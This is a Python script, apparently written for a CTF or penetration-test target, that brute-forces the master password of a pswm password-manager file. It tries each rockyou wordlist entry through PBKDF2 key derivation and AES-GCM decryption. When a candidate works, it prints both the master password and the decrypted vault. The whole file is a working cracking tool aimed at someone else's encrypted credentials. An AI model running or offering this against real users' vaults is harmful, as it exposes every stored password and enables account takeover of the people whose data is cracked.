#!/usr/bin/env python3
"""
PSWM Master Password Brute Force Script
Attempts to decrypt pswm encrypted password file using rockyou wordlist
"""
import base64
import sys
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

def decrypt_pswm(encrypted_data, master_password):
    """
    Attempt to decrypt pswm encrypted data with given master password
    Returns decrypted plaintext if successful, None otherwise
    """
    try:
        # Split the encrypted data into components
        parts = encrypted_data.strip().split('*')
        if len(parts) != 4:
            return None
        
        # Decode base64 components
        ciphertext = base64.b64decode(parts[0])
        salt = base64.b64decode(parts[1])
        nonce = base64.b64decode(parts[2])
        tag = base64.b64decode(parts[3])
        
        # Derive key from master password using PBKDF2
        key = PBKDF2(master_password, salt, dkLen=32)
        
        # Decrypt using AES-GCM
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        
        return plaintext.decode('utf-8')
    except Exception:
        return None

def main():
    # Read encrypted file
    try:
        with open('pswm_encrypted', 'r') as f:
            encrypted = f.read().strip()
    except FileNotFoundError:
        print("[-] Error: pswm_encrypted file not found")
        print("[*] Create it with the encrypted content from the target")
        sys.exit(1)
    
    # Try passwords from rockyou
    print("[*] Starting brute force attack on pswm master password...")
    print("[*] Using wordlist: /usr/share/wordlists/rockyou.txt")
    
    try:
        with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
            for i, password in enumerate(f, 1):
                password = password.strip()
                
                # Progress indicator every 1000 passwords
                if i % 1000 == 0:
                    print(f"[*] Tried {i} passwords...", end='\r')
                
                # Attempt decryption
                result = decrypt_pswm(encrypted, password)
                if result:
                    print(f"\n[+] SUCCESS! Master password found!")
                    print(f"[+] Master password: {password}")
                    print(f"[+] Decrypted content:")
                    print(f"{result}")
                    sys.exit(0)
    
    except FileNotFoundError:
        print("\n[-] Error: rockyou.txt not found")
        print("[*] Install with: sudo apt install wordlists")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user")
        sys.exit(1)
    
    print("\n[-] Password not found in wordlist")
    sys.exit(1)

if __name__ == "__main__":
    main()
